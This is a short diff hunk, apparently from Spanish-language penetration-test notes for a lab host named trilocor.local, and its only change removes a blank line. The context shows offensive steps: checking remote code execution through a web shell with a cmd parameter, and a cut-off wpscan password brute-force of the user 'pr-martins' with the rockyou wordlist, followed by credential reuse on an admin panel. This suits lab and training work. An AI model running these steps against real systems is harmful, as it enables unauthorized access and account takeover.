@@ -162,7 +162,6 @@ Confirmar RCE en `www.trilocor.local:8080/web-shell.php?cmd=id`.
 Fuerza bruta con `wpscan` contra el usuario `pr-martins` en el sitio principal; reutilizar esas credenciales en el login del panel PR.
 
 - **Endpoint:** `www.trilocor.local:8009/admin/` (POST)
-
 ```bash
 wpscan --password-attack xmlrpc -U pr-martins \
   -P /usr/share/wordlists/rockyou.txt \
